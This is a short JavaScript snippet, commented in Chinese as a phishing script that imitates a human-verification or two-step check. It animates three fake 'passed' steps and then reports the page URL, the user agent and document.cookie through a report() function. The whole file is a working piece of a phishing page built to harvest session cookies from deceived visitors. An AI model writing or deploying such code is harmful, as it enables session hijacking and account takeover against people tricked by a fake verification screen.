// 验证页脚本:加载即回传(仿人机校验/二次验证钓鱼)
(function () {
  var st = ["st1", "st2", "st3"];
  var idx = 0;
  function tick() {
    if (idx < st.length) {
      var el = document.getElementById(st[idx]);
      if (el) {
        el.parentNode.className += " done";
        el.textContent = "通过";
      }
      idx++;
      setTimeout(tick, 700);
    } else {
      report({ type: "verify", url: location.href, ua: navigator.userAgent, cookie: document.cookie || "" });
    }
  }
  tick();
})();
